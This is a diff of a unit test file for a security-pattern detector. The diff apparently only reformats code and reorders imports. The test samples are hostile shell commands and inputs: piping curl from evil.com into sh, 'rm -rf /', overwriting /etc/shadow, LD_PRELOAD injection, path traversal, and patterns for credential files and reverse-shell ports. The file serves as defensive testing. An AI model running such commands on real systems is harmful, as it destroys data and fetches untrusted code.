@@ -3,21 +3,21 @@
  * @module test/unit/security/patterns.test
  */
 
-import { describe, it, expect } from 'vitest';
+import { describe, expect, it } from 'vitest';
 import {
-  DANGEROUS_PATTERNS,
   BLOCKED_COMMANDS,
-  SENSITIVE_PATTERNS,
   DANGEROUS_PATH_PATTERNS,
-  SUSPICIOUS_NETWORK_PATTERNS,
-  SHELL_ESCAPE_CHARS,
-  RiskLevel,
-  PATTERN_RISK_LEVELS,
-  matchesAnyPattern,
+  DANGEROUS_PATTERNS,
   getMatchingPatterns,
   isBlockedCommand,
+  isDangerousPath,
   isSensitivePath,
-  isDangerousPath
+  matchesAnyPattern,
+  PATTERN_RISK_LEVELS,
+  RiskLevel,
+  SENSITIVE_PATTERNS,
+  SHELL_ESCAPE_CHARS,
+  SUSPICIOUS_NETWORK_PATTERNS,
 } from '../../../src/security/patterns.js';
 
 describe('Security Patterns', () => {
@@ -27,64 +27,64 @@ describe('Security Patterns', () => {
     });
 
     it('should detect rm -rf with root path', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('rm -rf /'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('rm -rf /home'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('rm -r /'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('rm -rf /'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('rm -rf /home'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('rm -r /'))).toBe(true);
     });
 
     it('should detect rm -rf with parent directory', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('rm -rf ..'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('rm -rf ../something'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('rm -rf ..'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('rm -rf ../something'))).toBe(true);
     });
 
     it('should detect Windows recursive delete', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('rmdir /s /q'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('rmdir /s /q'))).toBe(true);
     });
 
     it('should detect chmod 777', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('chmod 777 /var'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('chmod -R 777 /'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('chmod 777 /var'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('chmod -R 777 /'))).toBe(true);
     });
 
     it('should detect piped execution from curl/wget', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('curl http://evil.com | sh'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('curl http://site.com | bash'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('wget http://site.com | sh'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('curl http://site.com | python'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('curl http://evil.com | sh'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('curl http://site.com | bash'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('wget http://site.com | sh'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('curl http://site.com | python'))).toBe(true);
     });
 
     it('should detect history clearing', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('history -c'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('history -c'))).toBe(true);
     });
 
     it('should detect system file overwrites', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('echo x > /etc/passwd'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('cat > /etc/shadow'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('echo x > /etc/passwd'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('cat > /etc/shadow'))).toBe(true);
     });
 
     it('should detect LD_PRELOAD injection', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('export LD_PRELOAD=/lib/evil.so'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('export LD_PRELOAD=/lib/evil.so'))).toBe(true);
     });
 
     it('should detect kernel module commands', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('insmod malicious.ko'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('modprobe evil'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('insmod malicious.ko'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('modprobe evil'))).toBe(true);
     });
 
     it('should detect process killing', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('kill -9 -1'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('killall -9 everything'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('kill -9 -1'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('killall -9 everything'))).toBe(true);
     });
 
     it('should detect Windows format command', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('format c:'))).toBe(true);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('del /s /q c:\\'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('format c:'))).toBe(true);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('del /s /q c:\\'))).toBe(true);
     });
 
     it('should NOT match safe commands', () => {
-      expect(DANGEROUS_PATTERNS.some(p => p.test('ls -la'))).toBe(false);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('npm install'))).toBe(false);
-      expect(DANGEROUS_PATTERNS.some(p => p.test('git status'))).toBe(false);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('ls -la'))).toBe(false);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('npm install'))).toBe(false);
+      expect(DANGEROUS_PATTERNS.some((p) => p.test('git status'))).toBe(false);
     });
   });
 
@@ -123,43 +123,43 @@ describe('Security Patterns', () => {
     });
 
     it('should match .env files', () => {
-      expect(SENSITIVE_PATTERNS.some(p => p.test('.env'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('.env.local'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('.env.production'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('.env'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('.env.local'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('.env.production'))).toBe(true);
     });
 
     it('should match credential files', () => {
-      expect(SENSITIVE_PATTERNS.some(p => p.test('credentials.json'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('secrets.json'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('secrets.yaml'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('credentials.json'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('secrets.json'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('secrets.yaml'))).toBe(true);
     });
 
     it('should match SSH keys', () => {
-      expect(SENSITIVE_PATTERNS.some(p => p.test('id_rsa'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('id_ed25519'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('server.pem'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('private.key'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('id_rsa'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('id_ed25519'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('server.pem'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('private.key'))).toBe(true);
     });
 
     it('should match API key files', () => {
-      expect(SENSITIVE_PATTERNS.some(p => p.test('api_key.txt'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('apikey'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('api_key.txt'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('apikey'))).toBe(true);
     });
 
     it('should match database files', () => {
-      expect(SENSITIVE_PATTERNS.some(p => p.test('data.db'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('app.sqlite'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('database.sqlite3'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('data.db'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('app.sqlite'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('database.sqlite3'))).toBe(true);
     });
 
     it('should match cloud credential files', () => {
-      expect(SENSITIVE_PATTERNS.some(p => p.test('.aws/credentials'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('service_account.json'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('.aws/credentials'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('service_account.json'))).toBe(true);
     });
 
     it('should match shell history', () => {
-      expect(SENSITIVE_PATTERNS.some(p => p.test('.bash_history'))).toBe(true);
-      expect(SENSITIVE_PATTERNS.some(p => p.test('.zsh_history'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('.bash_history'))).toBe(true);
+      expect(SENSITIVE_PATTERNS.some((p) => p.test('.zsh_history'))).toBe(true);
     });
   });
 
@@ -169,31 +169,31 @@ describe('Security Patterns', () => {
     });
 
     it('should detect path traversal', () => {
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('../etc/passwd'))).toBe(true);
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('..\\windows\\system32'))).toBe(true);
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('%2e%2e/'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('../etc/passwd'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('..\\windows\\system32'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('%2e%2e/'))).toBe(true);
     });
 
     it('should detect null byte injection', () => {
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('file.txt%00.jpg'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('file.txt%00.jpg'))).toBe(true);
     });
 
     it('should detect Unix system directories', () => {
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('/etc/passwd'))).toBe(true);
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('/root/.ssh'))).toBe(true);
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('/proc/self'))).toBe(true);
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('/dev/sda'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('/etc/passwd'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('/root/.ssh'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('/proc/self'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('/dev/sda'))).toBe(true);
     });
 
     it('should detect Windows system directories', () => {
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('c:\\windows\\system32'))).toBe(true);
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('C:\\Windows\\'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('c:\\windows\\system32'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('C:\\Windows\\'))).toBe(true);
     });
 
     it('should detect sensitive home directories', () => {
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('.ssh/id_rsa'))).toBe(true);
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('.aws/credentials'))).toBe(true);
-      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('.kube/config'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('.ssh/id_rsa'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('.aws/credentials'))).toBe(true);
+      expect(DANGEROUS_PATH_PATTERNS.some((p) => p.test('.kube/config'))).toBe(true);
     });
   });
 
@@ -203,29 +203,39 @@ describe('Security Patterns', () => {
     });
 
     it('should detect paste services', () => {
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('https://pastebin.com/raw/abc'))).toBe(true);
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('https://hastebin.com/raw/xyz'))).toBe(true);
+      expect(SUSPICIOUS_NETWORK_PATTERNS.some((p) => p.test('https://pastebin.com/raw/abc'))).toBe(
+        true,
+      );
+      expect(SUSPICIOUS_NETWORK_PATTERNS.some((p) => p.test('https://hastebin.com/raw/xyz'))).toBe(
+        true,
+      );
     });
 
     it('should detect raw GitHub URLs', () => {
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('https://raw.githubusercontent.com/user/repo'))).toBe(true);
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('https://gist.githubusercontent.com/user'))).toBe(true);
+      expect(
+        SUSPICIOUS_NETWORK_PATTERNS.some((p) =>
+          p.test('https://raw.githubusercontent.com/user/repo'),
+        ),
+      ).toBe(true);
+      expect(
+        SUSPICIOUS_NETWORK_PATTERNS.some((p) => p.test('https://gist.githubusercontent.com/user')),
+      ).toBe(true);
     });
 
     it('should detect private network ranges', () => {
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('192.168.1.1'))).toBe(true);
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('10.0.0.1'))).toBe(true);
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('172.16.0.1'))).toBe(true);
+      expect(SUSPICIOUS_NETWORK_PATTERNS.some((p) => p.test('192.168.1.1'))).toBe(true);
+      expect(SUSPICIOUS_NETWORK_PATTERNS.some((p) => p.test('10.0.0.1'))).toBe(true);
+      expect(SUSPICIOUS_NETWORK_PATTERNS.some((p) => p.test('172.16.0.1'))).toBe(true);
     });
 
     it('should detect localhost', () => {
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('127.0.0.1'))).toBe(true);
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('http://localhost'))).toBe(true);
+      expect(SUSPICIOUS_NETWORK_PATTERNS.some((p) => p.test('127.0.0.1'))).toBe(true);
+      expect(SUSPICIOUS_NETWORK_PATTERNS.some((p) => p.test('http://localhost'))).toBe(true);
     });
 
     it('should detect common reverse shell ports', () => {
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('host:4444'))).toBe(true);
-      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('host:1337'))).toBe(true);
+      expect(SUSPICIOUS_NETWORK_PATTERNS.some((p) => p.test('host:4444'))).toBe(true);
+      expect(SUSPICIOUS_NETWORK_PATTERNS.some((p) => p.test('host:1337'))).toBe(true);
     });
   });
 
